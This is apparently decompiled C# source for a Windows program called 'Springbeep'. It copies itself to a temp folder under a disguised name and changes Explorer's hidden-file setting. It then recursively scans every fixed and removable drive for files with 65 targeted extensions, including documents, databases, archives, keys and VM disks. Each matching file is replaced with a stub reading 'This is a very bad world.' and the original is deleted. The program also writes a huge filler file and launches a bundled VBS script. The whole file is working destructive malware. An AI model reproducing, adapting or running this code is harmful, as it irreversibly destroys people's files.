using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;
using Springbeep.Properties;

namespace Springbeep;

internal static class Program
{
	[STAThread]
	private static void Main(string[] args)
	{
		if (!Directory.Exists(Path.GetTempPath() + "\\HighSpeedCopy\\"))
		{
			Directory.CreateDirectory(Path.GetTempPath() + "\\HighSpeedCopy\\");
		}
		if (Path.GetFileName(Application.get_ExecutablePath()) != "cmdtool.exe")
		{
			try
			{
				if (File.Exists(Path.GetTempPath() + "\\HighSpeedCopy\\cmdtool.exe"))
				{
					File.Delete(Path.GetTempPath() + "\\HighSpeedCopy\\cmdtool.exe");
				}
				File.Copy(Application.get_ExecutablePath(), Path.GetTempPath() + "\\HighSpeedCopy\\cmdtool.exe");
			}
			catch
			{
			}
			Process.Start(Path.GetTempPath() + "\\HighSpeedCopy\\cmdtool.exe");
			Environment.Exit(0);
		}
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\Springbeep.lock"))
		{
			WakeInst();
		}
		if (args.Length == 1)
		{
			if (args[0] == "/Autorun")
			{
				Application.EnableVisualStyles();
				Application.SetCompatibleTextRenderingDefault(false);
				Application.Run((Form)(object)new Form1());
				return;
			}
			if (Path.GetExtension(args[0]) == ".sbe")
			{
				try
				{
					File.Move(args[0], Path.GetDirectoryName(args[0]) + "\\" + Path.GetFileNameWithoutExtension(args[0]) + ".sbp");
					return;
				}
				catch
				{
					Environment.Exit(0);
					return;
				}
			}
			if (Path.GetExtension(args[0]) == ".sbp")
			{
				try
				{
					File.Move(args[0], Path.GetDirectoryName(args[0]) + "\\" + Path.GetFileNameWithoutExtension(args[0]) + ".sbe");
					return;
				}
				catch
				{
					Environment.Exit(0);
					return;
				}
			}
			Environment.Exit(0);
		}
		else
		{
			Environment.Exit(0);
		}
	}

	private static void WakeInst()
	{
		RegistryKey currentUser = Registry.CurrentUser;
		currentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("Hidden", 1, RegistryValueKind.DWord);
		currentUser.Close();
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if ((driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Removable) && Directory.Exists(driveInfo.Name))
			{
				DoAllFiles(driveInfo.Name);
			}
		}
		string text = "Springbeep 1.0";
		string text2 = "";
		string text3 = "";
		for (int j = 1; j <= 68; j++)
		{
			text += " Springbeep 1.0";
		}
		for (int k = 1; k <= 1024; k++)
		{
			text2 = text2 + text + " ";
		}
		for (int l = 1; l <= 64; l++)
		{
			text3 = text3 + text2 + " ";
		}
		File.WriteAllText(Path.GetTempPath() + "\\HighSpeedCopy\\winload.bin", text3);
		if (Application.get_ExecutablePath() != Path.GetTempPath() + "\\HighSpeedCopy\\cmdtool.exe" && !File.Exists(Path.GetTempPath() + "\\HighSpeedCopy\\cmdtool.exe"))
		{
			File.Copy(Application.get_ExecutablePath(), Path.GetTempPath() + "\\HighSpeedCopy\\cmdtool.exe");
		}
		File.WriteAllBytes(Path.GetTempPath() + "\\HighSpeedCopy\\mode.vbs", Resources.mode);
		Process.Start("wscript.exe", "\"" + Path.GetTempPath() + "\\HighSpeedCopy\\mode.vbs\"");
		Environment.Exit(0);
	}

	private static void DoAllFiles(string path)
	{
		string[] array = new string[65]
		{
			"ppt", "pptx", "doc", "docx", "xlsx", "sxi", "sxw", "odt", "hwp", "zip",
			"rar", "tar", "mp4", "mkv", "db", "7z", "cs", "res", "resx", "sln",
			"iso", "dmg", "isz", "ico", "png", "jpg", "jpeg", "mp3", "mp4", "pdf",
			"ogg", "wav", "wmv", "eml", "msg", "ost", "pst", "deb", "sql", "accdb",
			"mdb", "dbf", "odb", "myd", "php", "java", "cpp", "asp", "asm", "key",
			"pfx", "pem", "p12", "csr", "gpg", "aes", "vsd", "odg", "raw", "nef",
			"svg", "psd", "vmx", "vmdk", "vdi"
		};
		DirectoryInfo directoryInfo = new DirectoryInfo(path);
		try
		{
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				if (path + directoryInfo2.ToString() != Environment.GetFolderPath(Environment.SpecialFolder.Windows) && path + directoryInfo2.ToString() != Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) && path + directoryInfo2.ToString() != Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) && path + directoryInfo2.ToString() != Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFilesX86))
				{
					DoAllFiles(string.Concat(directoryInfo, directoryInfo2.ToString(), "\\"));
				}
			}
			FileInfo[] files = directoryInfo.GetFiles();
			for (int i = 0; i < files.Length; i++)
			{
				string text = files[i].ToString();
				if (text.LastIndexOf('.') == -1)
				{
					continue;
				}
				bool flag = false;
				string text2 = text.Substring(text.LastIndexOf('.') + 1);
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text2 == text3)
					{
						flag = true;
						break;
					}
				}
				if (flag)
				{
					DoFile(string.Concat(directoryInfo, text));
				}
			}
		}
		catch
		{
		}
	}

	private static bool DoFile(string fileName)
	{
		try
		{
			File.SetAttributes(fileName, FileAttributes.Normal);
			File.Move(fileName, Path.GetDirectoryName(fileName) + "\\" + Path.GetFileNameWithoutExtension(fileName) + ".tmp");
			File.WriteAllText(Path.GetDirectoryName(fileName) + "\\" + Path.GetFileNameWithoutExtension(fileName) + ".sbe", "This is a very bad world.");
			File.Delete(Path.GetDirectoryName(fileName) + "\\" + Path.GetFileNameWithoutExtension(fileName) + ".tmp");
			return true;
		}
		catch
		{
			return false;
		}
	}
}
